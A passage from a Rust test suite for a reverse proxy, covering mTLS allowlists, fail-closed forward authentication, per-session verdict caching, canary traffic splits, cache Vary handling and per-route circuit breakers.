        evaluate_mtls(&enforcer(false, vec!["Acme"]), Some("Gamma")),
        Some(495)
    );
}

#[test]
fn test_evaluate_mtls_allowlist_is_case_sensitive() {
    // Exact match, no case folding. Organization strings come
    // from the X.509 subject verbatim.
    assert_eq!(
        evaluate_mtls(&enforcer(true, vec!["Acme"]), Some("acme")),
        Some(495)
    );
}

#[test]
fn test_evaluate_mtls_empty_org_on_cert_fails_non_empty_allowlist() {
    // Cert present but carries no O= field (Some("") per
    // downstream_ssl_digest contract) vs a non-empty allowlist:
    // empty string never matches, so deny.
    assert_eq!(
        evaluate_mtls(&enforcer(true, vec!["Acme"]), Some("")),
        Some(495)
    );
}

#[test]
fn test_build_mirror_url_strips_trailing_slash_on_base() {
    assert_eq!(
        build_mirror_url("http://h/", "/p"),
        Some("http://h/p".to_string())
    );
}

#[test]
fn test_build_mirror_url_adds_leading_slash_to_path() {
    assert_eq!(
        build_mirror_url("http://h", "p"),
        Some("http://h/p".to_string())
    );
}

#[test]
fn test_build_mirror_url_rejects_invalid() {
    assert!(build_mirror_url("", "/").is_none());
    // Space in host is invalid per URI grammar.
    assert!(build_mirror_url("has spaces", "/").is_none());
}

// ---- Forward auth ----

fn fauth_req(method: &str, path: &str, headers: &[(&str, &str)]) -> lorica_http::RequestHeader {
    let mut req = lorica_http::RequestHeader::build(method, path.as_bytes(), None).unwrap();
    for (k, v) in headers {
        req.insert_header((*k).to_string(), *v).unwrap();
    }
    req
}

fn header_by(pairs: &[(String, String)], name: &str) -> Option<String> {
    pairs
        .iter()
        .find(|(n, _)| n.eq_ignore_ascii_case(name))
        .map(|(_, v)| v.clone())
}

#[test]
fn test_build_forward_auth_headers_includes_xff_and_context() {
    let req = fauth_req(
        "POST",
        "/admin/delete?id=7",
        &[
            ("host", "app.example.com"),
            ("cookie", "session=abc"),
            ("authorization", "Bearer tok"),
            ("user-agent", "curl/8"),
        ],
    );
    let out = build_forward_auth_headers(&req, Some("203.0.113.9"), "https");

    assert_eq!(
        header_by(&out, "X-Forwarded-Method").as_deref(),
        Some("POST")
    );
    assert_eq!(
        header_by(&out, "X-Forwarded-Proto").as_deref(),
        Some("https")
    );
    assert_eq!(
        header_by(&out, "X-Forwarded-Host").as_deref(),
        Some("app.example.com")
    );
    assert_eq!(
        header_by(&out, "X-Forwarded-Uri").as_deref(),
        Some("/admin/delete?id=7")
    );
    assert_eq!(
        header_by(&out, "X-Forwarded-For").as_deref(),
        Some("203.0.113.9")
    );
    assert_eq!(header_by(&out, "Cookie").as_deref(), Some("session=abc"));
    assert_eq!(
        header_by(&out, "Authorization").as_deref(),
        Some("Bearer tok")
    );
    assert_eq!(header_by(&out, "User-Agent").as_deref(), Some("curl/8"));
}

#[test]
fn test_build_forward_auth_headers_omits_missing_optionals() {
    // No cookie, no authorization, no client IP -> those headers
    // must NOT appear at all. Sending an empty Cookie would
    // intrude on auth services that look up sessions from that
    // header - they would 401 instead of treating as "no session".
    let req = fauth_req("GET", "/", &[("host", "h")]);
    let out = build_forward_auth_headers(&req, None, "http");
    assert!(header_by(&out, "Cookie").is_none());
    assert!(header_by(&out, "Authorization").is_none());
    assert!(header_by(&out, "X-Forwarded-For").is_none());
    // Required headers still present.
    assert_eq!(
        header_by(&out, "X-Forwarded-Method").as_deref(),
        Some("GET")
    );
    assert_eq!(
        header_by(&out, "X-Forwarded-Proto").as_deref(),
        Some("http")
    );
    assert_eq!(header_by(&out, "X-Forwarded-Uri").as_deref(), Some("/"));
}

#[test]
fn test_build_forward_auth_headers_uses_slash_for_empty_uri() {
    // `http::Uri` normalises an empty path to "". Check we still
    // send "/" so the auth service sees something parseable.
    let req = fauth_req("GET", "/", &[]);
    let out = build_forward_auth_headers(&req, None, "http");
    assert_eq!(header_by(&out, "X-Forwarded-Uri").as_deref(), Some("/"));
}

#[tokio::test]
async fn test_run_forward_auth_timeout_is_fail_closed() {
    // Point at a never-responding TCP listener to drive the timeout
    // branch. `run_forward_auth` must return FailClosed (not Deny),
    // so the caller fails the request with 503 rather than the
    // typical 401.
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    // Accept but never reply.
    tokio::spawn(async move {
        loop {
            let _ = listener.accept().await;
            // swallow; connection stays open idle
        }
    });
    let cfg = lorica_config::models::ForwardAuthConfig {
        address: format!("http://{addr}/verify"),
        timeout_ms: 150,
        response_headers: vec![],
        verdict_cache_ttl_ms: 0,
    };
    let req = fauth_req("GET", "/", &[("host", "x")]);
    let outcome = run_forward_auth(&cfg, &req, None, "http").await;
    match outcome {
        ForwardAuthOutcome::FailClosed { reason } => {
            assert!(
                reason.to_lowercase().contains("timeout")
                    || reason.to_lowercase().contains("unreachable")
                    || reason.to_lowercase().contains("operation timed out"),
                "reason should mention a timeout/unreachable, got: {reason}"
            );
        }
        other => panic!("expected FailClosed on timeout, got {other:?}"),
    }
}

#[tokio::test]
async fn test_run_forward_auth_unreachable_is_fail_closed() {
    // Bind a port, immediately drop the listener -> next connect
    // gets refused. Must fail closed, NOT bypass auth.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    drop(listener);
    let cfg = lorica_config::models::ForwardAuthConfig {
        address: format!("http://{addr}/verify"),
        timeout_ms: 500,
        response_headers: vec![],
        verdict_cache_ttl_ms: 0,
    };
    let req = fauth_req("GET", "/", &[("host", "x")]);
    let outcome = run_forward_auth(&cfg, &req, None, "http").await;
    assert!(matches!(outcome, ForwardAuthOutcome::FailClosed { .. }));
}

// ---- Forward auth verdict cache ----

#[test]
fn test_verdict_cache_key_without_cookie_is_none() {
    // No cookie = no session identity = we must refuse to cache
    // (otherwise an anonymous request could leak an earlier user's
    // Allow verdict to another anonymous request).
    let req = fauth_req("GET", "/", &[("host", "x")]);
    assert!(verdict_cache_key("route-a", &req).is_none());
}

#[test]
fn test_verdict_cache_key_varies_by_route() {
    // Same cookie on two different routes must produce different
    // cache keys so a verdict allowed on route A cannot be served
    // on route B (different mTLS / forward-auth policy).
    let req = fauth_req("GET", "/", &[("host", "x"), ("cookie", "session=abc")]);
    let k1 = verdict_cache_key("route-a", &req).unwrap();
    let k2 = verdict_cache_key("route-b", &req).unwrap();
    assert_ne!(k1, k2);
}

#[test]
fn test_verdict_cache_key_varies_by_cookie() {
    let req_a = fauth_req("GET", "/", &[("host", "x"), ("cookie", "session=aaa")]);
    let req_b = fauth_req("GET", "/", &[("host", "x"), ("cookie", "session=bbb")]);
    let k1 = verdict_cache_key("route-a", &req_a).unwrap();
    let k2 = verdict_cache_key("route-a", &req_b).unwrap();
    assert_ne!(k1, k2);
}

#[test]
fn test_verdict_cache_key_stable_for_same_inputs() {
    let req = fauth_req("GET", "/", &[("host", "x"), ("cookie", "session=abc")]);
    let k1 = verdict_cache_key("route-a", &req).unwrap();
    let k2 = verdict_cache_key("route-a", &req).unwrap();
    assert_eq!(k1, k2);
}

#[tokio::test]
async fn test_verdict_cache_hit_served_without_upstream_call() {
    use std::sync::atomic::{AtomicU32, Ordering};
    let calls = Arc::new(AtomicU32::new(0));
    let calls_c = calls.clone();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        loop {
            let (mut stream, _) = match listener.accept().await {
                Ok(p) => p,
                Err(_) => return,
            };
            calls_c.fetch_add(1, Ordering::SeqCst);
            tokio::spawn(async move {
                use tokio::io::{AsyncReadExt, AsyncWriteExt};
                let mut buf = [0u8; 2048];
                let _ = stream.read(&mut buf).await;
                let resp = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok";
                let _ = stream.write_all(resp).await;
                let _ = stream.shutdown().await;
            });
        }
    });

    let cfg = lorica_config::models::ForwardAuthConfig {
        address: format!("http://{addr}/verify"),
        timeout_ms: 2_000,
        response_headers: vec![],
        verdict_cache_ttl_ms: 30_000,
    };
    let req = fauth_req("GET", "/", &[("host", "x"), ("cookie", "session=abc")]);

    verdict_cache_reset_for_test();

    let r1 = run_forward_auth_keyed(
        &cfg,
        &req,
        None,
        "http",
        "cache-hit-route",
        &VerdictCacheEngine::Local,
    )
    .await;
    assert!(matches!(r1, ForwardAuthOutcome::Allow { .. }));
    let r2 = run_forward_auth_keyed(
        &cfg,
        &req,
        None,
        "http",
        "cache-hit-route",
        &VerdictCacheEngine::Local,
    )
    .await;
    assert!(matches!(r2, ForwardAuthOutcome::Allow { .. }));
    assert_eq!(
        calls.load(Ordering::SeqCst),
        1,
        "second request must be served from cache (no auth call)"
    );
}

#[tokio::test]
async fn test_verdict_cache_honors_auth_no_store_directive() {
    use std::sync::atomic::{AtomicU32, Ordering};
    let calls = Arc::new(AtomicU32::new(0));
    let calls_c = calls.clone();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        loop {
            let (mut stream, _) = match listener.accept().await {
                Ok(p) => p,
                Err(_) => return,
            };
            calls_c.fetch_add(1, Ordering::SeqCst);
            tokio::spawn(async move {
                use tokio::io::{AsyncReadExt, AsyncWriteExt};
                let mut buf = [0u8; 2048];
                let _ = stream.read(&mut buf).await;
                let resp = b"HTTP/1.1 200 OK\r\nCache-Control: no-store\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok";
                let _ = stream.write_all(resp).await;
                let _ = stream.shutdown().await;
            });
        }
    });

    let cfg = lorica_config::models::ForwardAuthConfig {
        address: format!("http://{addr}/verify"),
        timeout_ms: 2_000,
        response_headers: vec![],
        verdict_cache_ttl_ms: 30_000,
    };
    let req = fauth_req(
        "GET",
        "/",
        &[("host", "x"), ("cookie", "session=no-store-abc")],
    );

    verdict_cache_reset_for_test();

    let _ = run_forward_auth_keyed(
        &cfg,
        &req,
        None,
        "http",
        "ns-route",
        &VerdictCacheEngine::Local,
    )
    .await;
    let _ = run_forward_auth_keyed(
        &cfg,
        &req,
        None,
        "http",
        "ns-route",
        &VerdictCacheEngine::Local,
    )
    .await;
    assert_eq!(
        calls.load(Ordering::SeqCst),
        2,
        "Cache-Control: no-store must prevent caching"
    );
}

#[test]
fn test_verdict_cache_key_concatenates_with_nul_separator() {
    // Regression: earlier versions used a 64-bit DefaultHasher as
    // the cache key, leaving a small birthday-collision window
    // where user B could receive user A's cached Allow headers.
    // We now use a literal NUL-separated concat so two different
    // (route_id, cookie) inputs produce strictly different keys
    // regardless of hashing behaviour.
    let req1 = fauth_req("GET", "/", &[("cookie", "abc")]);
    let req2 = fauth_req("GET", "/", &[("cookie", "abc")]);
    let k1 = verdict_cache_key("a", &req1).unwrap();
    let k2 = verdict_cache_key("a", &req2).unwrap();
    assert_eq!(k1, k2);
    assert!(k1.contains('\0'), "key must carry the NUL boundary");
    assert!(k1.starts_with("a\0"), "key must prefix with route_id");
}

// NOTE: a unit test exercising the bounded-FIFO insertion path
// would ideally push > VERDICT_CACHE_MAX_ENTRIES entries and
// assert the oldest are evicted. We don't do that here because
// this test module shares process-global state with other tests
// (FORWARD_AUTH_VERDICT_CACHE is static), and a big-insert test
// flakes the suite when another test clears the cache mid-flight
// under cargo's default parallel execution. The FIFO invariant
// is instead verified by inspection of `verdict_cache_insert`
// (straight-line `while order.len() >= cap { pop_front + remove
// }`) and by the following small-insert test that demonstrates
// the queue+map stay in lockstep.

#[tokio::test]
async fn test_verdict_cache_off_when_ttl_zero() {
    use std::sync::atomic::{AtomicU32, Ordering};
    let calls = Arc::new(AtomicU32::new(0));
    let calls_c = calls.clone();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        loop {
            let (mut stream, _) = match listener.accept().await {
                Ok(p) => p,
                Err(_) => return,
            };
            calls_c.fetch_add(1, Ordering::SeqCst);
            tokio::spawn(async move {
                use tokio::io::{AsyncReadExt, AsyncWriteExt};
                let mut buf = [0u8; 2048];
                let _ = stream.read(&mut buf).await;
                let resp = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok";
                let _ = stream.write_all(resp).await;
                let _ = stream.shutdown().await;
            });
        }
    });

    let cfg = lorica_config::models::ForwardAuthConfig {
        address: format!("http://{addr}/verify"),
        timeout_ms: 2_000,
        response_headers: vec![],
        verdict_cache_ttl_ms: 0,
    };
    let req = fauth_req("GET", "/", &[("host", "x"), ("cookie", "session=ttl0")]);

    verdict_cache_reset_for_test();

    let _ = run_forward_auth_keyed(
        &cfg,
        &req,
        None,
        "http",
        "off-route",
        &VerdictCacheEngine::Local,
    )
    .await;
    let _ = run_forward_auth_keyed(
        &cfg,
        &req,
        None,
        "http",
        "off-route",
        &VerdictCacheEngine::Local,
    )
    .await;
    assert_eq!(
        calls.load(Ordering::SeqCst),
        2,
        "ttl=0 must disable caching (strict zero-trust default)"
    );
}

// ---- Canary traffic split ----

#[test]
fn test_canary_bucket_is_deterministic_and_in_range() {
    // Same inputs -> same bucket on every call within a process.
    for i in 0..16 {
        let ip = format!("10.0.0.{i}");
        let a = canary_bucket("r1", &ip);
        let b = canary_bucket("r1", &ip);
        assert_eq!(a, b, "hash must be stable for {ip}");
        assert!(a < 100, "bucket {a} out of range");
    }
}

#[test]
fn test_canary_bucket_matches_reference_fnv1a() {
    // Pins the hash construction: any change to canary_bucket's
    // constants or update rule would reshuffle every operator's
    // canary assignments across a rolling upgrade, which is
    // exactly the cross-restart instability we're guarding
    // against. The reference implementation below is a clean-room
    // FNV-1a (64 bit) with a NUL separator between fields; it
    // must stay byte-for-byte equivalent to canary_bucket.
    fn reference(route_id: &str, client_ip: &str) -> u8 {
        const FNV_OFFSET: u64 = 0xcbf2_9ce4_8422_2325;
        const FNV_PRIME: u64 = 0x0000_0100_0000_01b3;
        let mut h = FNV_OFFSET;
        for b in route_id.as_bytes() {
            h ^= *b as u64;
            h = h.wrapping_mul(FNV_PRIME);
        }
        h ^= 0;
        h = h.wrapping_mul(FNV_PRIME);
        for b in client_ip.as_bytes() {
            h ^= *b as u64;
            h = h.wrapping_mul(FNV_PRIME);
        }
        (h % 100) as u8
    }
    for route in ["", "r1", "route-a", "route-b"] {
        for ip in ["", "10.0.0.1", "10.0.0.2", "2001:db8::1"] {
            assert_eq!(
                canary_bucket(route, ip),
                reference(route, ip),
                "drift for ({route}, {ip})",
            );
        }
    }
}

#[test]
fn test_canary_bucket_varies_by_route_and_ip() {
    // Different routes -> a given IP lands on different buckets.
    // Not a strict requirement but a smoke test: if it's always the
    // same, we've broken the "per-route bucket" contract.
    let mut differs = false;
    for i in 0..32 {
        let ip = format!("10.0.0.{i}");
        if canary_bucket("r1", &ip) != canary_bucket("r2", &ip) {
            differs = true;
            break;
        }
    }
    assert!(
        differs,
        "changing route_id should change at least one bucket"
    );
}

fn split(name: &str, pct: u8, backends: &[&str]) -> lorica_config::models::TrafficSplit {
    lorica_config::models::TrafficSplit {
        name: name.into(),
        weight_percent: pct,
        backend_ids: backends.iter().map(|s| (*s).into()).collect(),
    }
}

#[test]
fn test_pick_traffic_split_backends_cumulative_bands() {
    // 5% + 10% = 15% diverted. Buckets 0..=4 -> A, 5..=14 -> B,
    // 15..=99 -> None (route default).
    let splits = vec![split("a", 5, &["a"]), split("b", 10, &["b"])];
    let backends: Vec<Option<Vec<Backend>>> = vec![
        Some(vec![mk_backend_with_id("a")]),
        Some(vec![mk_backend_with_id("b")]),
    ];

    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 0).unwrap()[0].id,
        "a"
    );
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 4).unwrap()[0].id,
        "a"
    );
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 5).unwrap()[0].id,
        "b"
    );
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 14).unwrap()[0].id,
        "b"
    );
    assert!(pick_traffic_split_backends(&splits, &backends, 15).is_none());
    assert!(pick_traffic_split_backends(&splits, &backends, 99).is_none());
}

#[test]
fn test_pick_traffic_split_backends_zero_weight_skipped() {
    // A split with weight 0 must consume NO bucket range and not
    // affect subsequent splits. This lets operators "disable" a
    // split without deleting it (useful for staged rollout/rollback).
    let splits = vec![split("a", 0, &["a"]), split("b", 30, &["b"])];
    let backends = vec![
        Some(vec![mk_backend_with_id("a")]),
        Some(vec![mk_backend_with_id("b")]),
    ];
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 0).unwrap()[0].id,
        "b"
    );
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 29).unwrap()[0].id,
        "b"
    );
    assert!(pick_traffic_split_backends(&splits, &backends, 30).is_none());
}

#[test]
fn test_pick_traffic_split_backends_sum_over_100_clamped() {
    // Operator typo: 60 + 60 = 120. The engine clamps at 100 so the
    // second split's tail is effectively lost (buckets 0..=59 -> A,
    // 60..=99 -> B). The API layer rejects this case at write-time;
    // this test is the engine's defensive behaviour if a stale or
    // externally-edited config slips through.
    let splits = vec![split("a", 60, &["a"]), split("b", 60, &["b"])];
    let backends = vec![
        Some(vec![mk_backend_with_id("a")]),
        Some(vec![mk_backend_with_id("b")]),
    ];
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 59).unwrap()[0].id,
        "a"
    );
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 60).unwrap()[0].id,
        "b"
    );
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 99).unwrap()[0].id,
        "b"
    );
}

#[test]
fn test_pick_traffic_split_backends_none_resolved_consumes_band() {
    // A split whose backends all dangle normalises to `None` in
    // `resolved` but keeps its declared weight band. Traffic in that
    // band MUST fall back to route defaults (None), not steal the
    // next split's bucket. Otherwise a typo would silently rebalance
    // 20% of traffic to the wrong backend.
    let splits = vec![
        split("broken", 20, &["does-not-exist"]),
        split("good", 20, &["g"]),
    ];
    let backends: Vec<Option<Vec<Backend>>> = vec![None, Some(vec![mk_backend_with_id("g")])];
    assert!(pick_traffic_split_backends(&splits, &backends, 0).is_none());
    assert!(pick_traffic_split_backends(&splits, &backends, 19).is_none());
    assert_eq!(
        pick_traffic_split_backends(&splits, &backends, 20).unwrap()[0].id,
        "g"
    );
}

#[test]
fn test_pick_traffic_split_backends_empty_list_yields_none() {
    assert!(pick_traffic_split_backends(&[], &[], 0).is_none());
    assert!(pick_traffic_split_backends(&[], &[], 99).is_none());
}

#[test]
fn test_from_store_traffic_splits_resolve_and_skip_broken() {
    let mut route = make_route("rts", "example.com", "/", true);
    route.traffic_splits = vec![
        split("v2", 10, &["b-v2"]),
        split("dangling", 5, &["missing"]), // all dangling -> None
        split("v3", 5, &["b-v3a", "b-v3b"]),
        split("zero", 0, &["b-v2"]), // weight 0 -> None
    ];

    let b_default = make_backend("b-default", "10.0.0.1:80");
    let b_v2 = make_backend("b-v2", "10.0.1.1:80");
    let b_v3a = make_backend("b-v3a", "10.0.2.1:80");
    let b_v3b = make_backend("b-v3b", "10.0.2.2:80");
    let links = vec![("rts".into(), "b-default".into())];

    let config = ProxyConfig::from_store(
        vec![route],
        vec![b_default, b_v2, b_v3a, b_v3b],
        vec![],
        links,
        ProxyConfigGlobals::default(),
    );
    let entry = &config.routes_by_host.get("example.com").unwrap()[0];

    assert_eq!(entry.traffic_split_backends[0].as_ref().unwrap().len(), 1);
    assert!(
        entry.traffic_split_backends[1].is_none(),
        "all-dangling split must normalise to None"
    );
    assert_eq!(entry.traffic_split_backends[2].as_ref().unwrap().len(), 2);
    assert!(
        entry.traffic_split_backends[3].is_none(),
        "zero-weight split stays None in resolved table"
    );
}

#[test]
fn test_canary_bucket_distribution_roughly_uniform() {
    // Sanity check: over 1000 distinct client IPs, a 20% split should
    // grab roughly 20% of them. Tolerance is wide (±7%) because we
    // use DefaultHasher and the sample is small; a bad hash (always
    // returning the same bucket) would fail dramatically.
    let splits = vec![split("canary", 20, &["canary"])];
    let backends: Vec<Option<Vec<Backend>>> = vec![Some(vec![mk_backend_with_id("canary")])];
    let mut hits = 0u32;
    for i in 0..1000u32 {
        let ip = format!("10.{}.{}.{}", (i >> 16) & 0xff, (i >> 8) & 0xff, i & 0xff);
        let b = canary_bucket("r-dist", &ip);
        if pick_traffic_split_backends(&splits, &backends, b).is_some() {
            hits += 1;
        }
    }
    let pct = hits as f64 / 1000.0 * 100.0;
    assert!(
        (13.0..=27.0).contains(&pct),
        "20% split produced {pct:.1}% of hits, likely a hash distribution bug"
    );
}

fn hmap(pairs: &[(&str, &str)]) -> http::HeaderMap {
    let mut m = http::HeaderMap::new();
    for (k, v) in pairs {
        m.insert(
            http::header::HeaderName::from_bytes(k.as_bytes()).unwrap(),
            http::header::HeaderValue::from_str(v).unwrap(),
        );
    }
    m
}

#[test]
fn test_variance_no_headers_yields_none() {
    assert!(compute_cache_variance(&[], "", &hmap(&[]), "/").is_none());
}

#[test]
fn test_variance_route_headers_only() {
    let headers = hmap(&[("accept-encoding", "gzip")]);
    let v1 = compute_cache_variance(&["Accept-Encoding".to_string()], "", &headers, "/");
    assert!(v1.is_some());

    // Different header value -> different variance.
    let headers2 = hmap(&[("accept-encoding", "br")]);
    let v2 = compute_cache_variance(&["Accept-Encoding".to_string()], "", &headers2, "/");
    assert_ne!(v1, v2);
}

#[test]
fn test_variance_route_and_response_vary_merge() {
    let headers = hmap(&[("accept-encoding", "gzip"), ("accept-language", "en")]);

    // Only route-configured.
    let v_route = compute_cache_variance(&["accept-encoding".to_string()], "", &headers, "/");

    // Only response-signalled.
    let v_resp = compute_cache_variance(&[], "Accept-Encoding", &headers, "/");

    // Same header from either source should produce the same variance.
    assert_eq!(v_route, v_resp);

    // Union picks up both; a new header changes the hash.
    let v_both = compute_cache_variance(
        &["accept-encoding".to_string()],
        "Accept-Language",
        &headers,
        "/",
    );
    assert_ne!(v_route, v_both);
}

#[test]
fn test_variance_case_insensitive_and_dedup() {
    let headers = hmap(&[("accept-encoding", "gzip")]);
    let a = compute_cache_variance(
        &["Accept-Encoding".to_string()],
        "accept-encoding, ACCEPT-ENCODING",
        &headers,
        "/",
    );
    let b = compute_cache_variance(&["accept-encoding".to_string()], "", &headers, "/");
    assert_eq!(a, b);
}

#[test]
fn test_variance_star_anchors_on_uri() {
    let headers = hmap(&[]);
    let v_a = compute_cache_variance(&[], "*", &headers, "/a");
    let v_b = compute_cache_variance(&[], "*", &headers, "/b");
    let v_a_again = compute_cache_variance(&[], "*", &headers, "/a");
    assert!(v_a.is_some());
    assert_ne!(v_a, v_b);
    assert_eq!(v_a, v_a_again);
}

#[test]
fn test_variance_missing_request_header_uses_empty_value() {
    // When the client does not send the vary header, it must still
    // produce a deterministic variance distinct from the case where the
    // header is present - otherwise clients without the header would
    // collide with whichever variant the first sender populated.
    let no_header = hmap(&[]);
    let with_header = hmap(&[("accept-encoding", "gzip")]);
    let route = vec!["accept-encoding".to_string()];

    let v_empty = compute_cache_variance(&route, "", &no_header, "/");
    let v_gzip = compute_cache_variance(&route, "", &with_header, "/");

    assert!(v_empty.is_some());
    assert_ne!(v_empty, v_gzip);
}

fn vary_req(method: &str, path: &str, headers: &[(&str, &str)]) -> lorica_http::RequestHeader {
    let mut req = lorica_http::RequestHeader::build(method, path.as_bytes(), None).unwrap();
    for (k, v) in headers {
        req.insert_header((*k).to_string(), *v).unwrap();
    }
    req
}

fn vary_resp(vary: Option<&str>) -> lorica_http::ResponseHeader {
    let mut resp = lorica_http::ResponseHeader::build(200, None).unwrap();
    if let Some(v) = vary {
        resp.insert_header("vary", v).unwrap();
    }
    resp
}

fn vary_meta(vary: Option<&str>) -> CacheMeta {
    let now = std::time::SystemTime::now();
    CacheMeta::new(
        now + std::time::Duration::from_secs(300),
        now,
        0,
        0,
        vary_resp(vary),
    )
}

#[test]
fn test_cache_vary_for_request_plumbs_route_and_meta() {
    // Real route with operator-configured vary header + a CacheMeta that
    // also advertises a different Vary header. Proves the glue reads
    // from both inputs, not just one.
    let mut route = make_route("r-vary", "example.com", "/", true);
    route.cache_vary_headers = vec!["Accept-Encoding".into()];

    let meta = vary_meta(Some("Accept-Language"));
    let req_gzip_en = vary_req(
        "GET",
        "/x",
        &[("accept-encoding", "gzip"), ("accept-language", "en")],
    );
    let req_gzip_fr = vary_req(
        "GET",
        "/x",
        &[("accept-encoding", "gzip"), ("accept-language", "fr")],
    );
    let req_br_en = vary_req(
        "GET",
        "/x",
        &[("accept-encoding", "br"), ("accept-language", "en")],
    );

    let v_ge = cache_vary_for_request(Some(&route), &meta, &req_gzip_en);
    let v_gf = cache_vary_for_request(Some(&route), &meta, &req_gzip_fr);
    let v_be = cache_vary_for_request(Some(&route), &meta, &req_br_en);

    assert!(v_ge.is_some());
    assert_ne!(v_ge, v_gf, "language change must partition the cache");
    assert_ne!(v_ge, v_be, "encoding change must partition the cache");
}

#[test]
fn test_cache_vary_for_request_without_route_falls_back_to_response_vary() {
    // No route context (e.g. catch-all path without a Route attached in
    // ctx): the response's Vary header is still honoured so RFC 7234
    // semantics survive regardless of operator configuration.
    let meta = vary_meta(Some("Accept-Encoding"));
    let req_a = vary_req("GET", "/", &[("accept-encoding", "gzip")]);
    let req_b = vary_req("GET", "/", &[("accept-encoding", "br")]);

    let a = cache_vary_for_request(None, &meta, &req_a);
    let b = cache_vary_for_request(None, &meta, &req_b);
    assert!(a.is_some());
    assert_ne!(a, b);
}

#[test]
fn test_cache_vary_for_request_no_config_no_response_yields_none() {
    // Feature unused: zero cost, no variance, asset caches under its
    // primary key alone.
    let route = make_route("r-novary", "example.com", "/", true);
    let meta = vary_meta(None);
    let req = vary_req("GET", "/", &[]);
    assert!(cache_vary_for_request(Some(&route), &meta, &req).is_none());
}

#[test]
fn test_cache_vary_for_request_star_anchors_on_path_and_query() {
    // `Vary: *` -> variance anchored on URI so two URLs don't share a
    // slot but repeat requests to the same URL still hit a stable
    // variant.
    let meta = vary_meta(Some("*"));
    let req_a = vary_req("GET", "/a?v=1", &[]);
    let req_a_repeat = vary_req("GET", "/a?v=1", &[]);
    let req_b = vary_req("GET", "/b", &[]);

    let v_a = cache_vary_for_request(None, &meta, &req_a);
    let v_a2 = cache_vary_for_request(None, &meta, &req_a_repeat);
    let v_b = cache_vary_for_request(None, &meta, &req_b);

    assert!(v_a.is_some());
    assert_eq!(v_a, v_a2);
    assert_ne!(v_a, v_b);
}

#[test]
fn test_cache_predictor_remembers_uncacheable() {
    // Confirm the shared CACHE_PREDICTOR static boots correctly and
    // behaves as expected against the CacheKey layout used by
    // `cache_key_callback` (empty namespace, "host+path" primary). This
    // guards against accidental changes to that layout silently breaking
    // predictor lookups.
    use lorica_cache::predictor::CacheablePredictor;
    let predictor = *CACHE_PREDICTOR;
    let key = CacheKey::new(
        String::new(),
        "predictor-test.example/foo".to_string(),
        String::new(),
    );

    // Fresh key -> cacheable until proven otherwise.
    assert!(predictor.cacheable_prediction(&key));

    // Origin says uncacheable -> predictor remembers.
    assert_eq!(
        predictor.mark_uncacheable(&key, NoCacheReason::OriginNotCache),
        Some(true)
    );
    assert!(!predictor.cacheable_prediction(&key));

    // Transient errors must NOT poison the prediction.
    let transient_key = CacheKey::new(
        String::new(),
        "predictor-test.example/transient".to_string(),
        String::new(),
    );
    assert_eq!(
        predictor.mark_uncacheable(&transient_key, NoCacheReason::InternalError),
        None
    );
    assert!(predictor.cacheable_prediction(&transient_key));

    // Re-cacheable after mark_cacheable clears the entry.
    predictor.mark_cacheable(&key);
    assert!(predictor.cacheable_prediction(&key));
}

// ------------------------------------------------------------------
// Circuit breaker scoping tests
// ------------------------------------------------------------------

#[test]
fn breaker_isolates_routes_sharing_a_backend() {
    // Two routes pointing at the same backend IP:port. One route fails
    // structurally (all 5xx) while the other is healthy. The breaker
    // must only open for the failing (route, backend) pair - the
    // sibling route must still see the backend as available.
    let breaker = CircuitBreaker::new(5, 10);
    let backend = "10.0.0.1:3080";
    let route_failing = "route-dashboard";
    let route_healthy = "route-webapi";

    for _ in 0..5 {
        breaker.record_failure(route_failing, backend);
    }

    assert!(
        !breaker.is_available(route_failing, backend),
        "breaker must be open for the failing route"
    );
    assert!(
        breaker.is_available(route_healthy, backend),
        "sibling route must not inherit the failure state"
    );
}

#[test]
fn breaker_opens_after_threshold_failures() {
    let breaker = CircuitBreaker::new(3, 10);
    let route = "r1";
    let backend = "10.0.0.1:3080";

    breaker.record_failure(route, backend);
    breaker.record_failure(route, backend);
    assert!(
        breaker.is_available(route, backend),
        "should still be closed at 2 < threshold"
    );
    breaker.record_failure(route, backend);
    assert!(
        !breaker.is_available(route, backend),
        "should open at threshold"
    );
}

#[test]
fn breaker_success_resets_failure_count() {
    let breaker = CircuitBreaker::new(3, 10);
    let route = "r1";
    let backend = "10.0.0.1:3080";

    breaker.record_failure(route, backend);
    breaker.record_failure(route, backend);
    breaker.record_success(route, backend);
    breaker.record_failure(route, backend);
    breaker.record_failure(route, backend);
    assert!(
        breaker.is_available(route, backend),
        "two failures after a success should not reach threshold"
    );
}

#[test]
fn breaker_cooldown_moves_to_half_open() {
    // Tiny cooldown so the test does not sleep for seconds.
    let breaker = CircuitBreaker::new(1, 0);
    let route = "r1";
    let backend = "10.0.0.1:3080";

    breaker.record_failure(route, backend);
    assert!(
        breaker.is_available(route, backend),
        "0s cooldown allows probe"
    );

    // A success on the probe closes the breaker again.
    breaker.record_success(route, backend);
    assert!(breaker.is_available(route, backend));
}

#[test]
fn breaker_unknown_route_is_available_by_default() {
    let breaker = CircuitBreaker::new(5, 10);
    assert!(breaker.is_available("never-seen", "10.0.0.1:3080"));
}

// ---- Redirect URL construction ----

#[test]
fn redirect_location_route_level_appends_path_and_query() {
    // Route-level redirect_to: migration use case. The target is a
    // base URL; the request path + query are appended so every
    // subpath of the old host maps to the new host.
    let loc = build_redirect_location(
